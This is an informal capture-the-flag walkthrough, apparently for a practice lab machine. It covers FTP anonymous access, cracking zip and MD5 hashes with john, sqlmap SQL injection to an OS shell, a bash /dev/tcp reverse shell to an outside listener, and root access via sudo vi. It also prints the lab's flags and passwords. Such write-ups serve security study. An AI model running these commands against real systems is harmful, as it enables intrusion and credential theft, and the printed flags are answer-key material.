@@ -1,0 +1,39 @@
+let's first lauch an nmap : nmap -sC -sV -p- 10.129.95.174
+we can see 3 open port : ssh, http, ftp
+We know that we can connect to ftp without password using "anonymous" user
+ftp anonymous@10.129.95.174
+we can see that we have access to oe file : "backup.zip" so we download it on our machine : get backup.zip
+but it's a protected zip so we don't have access to its content so we'll use john to crack it
+zip2john backup.zip > myhashzip # so now we have the hash of the password in a file name myhashzip
+john -wordlist=/usr/share/wordlists/rockyou.txt myhashzip #so now we have decrypted the password 
+and we can get it using : john --show myhashzip
+so now we can analyze the content of the index.php file in the backup.zip archive
+we can get an other hash password, this time of the admin page of the web site 
+so we put it in a text file in order to crack it : echo '2cb42f8734ea607eefed3b70af13bbd3' > adminpassword.txt
+so now we try to crack it : john -wordlist=/usr/share/wordlists/rockyou.txt adminpassword.txt
+but we can see that john can't really find which type of hash it is (multiple possibilities) and we saw in the php file that there was a MD5 code before the hash, so we try to force a MD5 format : john --format=Raw-MD5 -wordlist=/usr/share/wordlists/rockyou.txt adminpassword.txt
+and we get that the password is qwerty789 by using : john --show adminpassword.txt
+YAYY!! now we can enter in the site
+In the web site we can see a data base of type of car and a search bar,so let's try to put something in the search bar, we can see that a "?serach=test" is put at the end of the url
+
+So now let's try to use sqlmap to get a command execution via an sql injection : sqlmap -u http://10.129.95.174/dashboard.php?search=test --os-shell --cookie="PHPSESSID=19isjkkgcdj0jj0jhd03mmiv94"
+we use a cookie in order to enter the site without any other indentification, we can get the cookie using a browser extension like "cookie editor"
+now that we have an os-shell let's try to get a reverse shell
+so we used an other terminal tab to launch our netcat listener : nc -lvnp 1337
+and we put this line in our os-shell in order for netcat to get the shell : bash -c "bash -i >& /dev/tcp/10.10.14.240/1337 0>&1"
+
+YAYY!! we got our reverse shell, we can find the user flag in /var/lib/postgresql/user.txt
+""ec9b13ca4d6229cd5cc1e09980965bf7""
+
+let's try to find out what command we are allow to use as sudo : sudo -l
+bad luck we need the postgres user password to see that
+maybe it is in clear in the web site php files because the site needs to have access to the database, so let's cat it : cat /var/www/html/dashboard.php
+YAYY!! we found the password for postgres : P@s5w0rd!
+so let's use sudo -l
+we found that we have a sudo access to the command : /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+we can sometimes get disconnected from the os-shell so also from the reverse shell, so now let's reconnect using ssh, it's also more interactive to connect that way : ssh postgres@10.129.95.174 using P@s5w0rd! as the password
+
+So now let's try to find how we can abuse this command, after a few research we can find out that if we go editting the file with vim (using the previous command) and then type ":set shell=/bin/sh" and then ":shell" we can get a root access
+so now that we  are in the terminal as root we can go cat the /root/root.txt file 
+""dd6e058e814260bc70e9bbdef2715849 ""
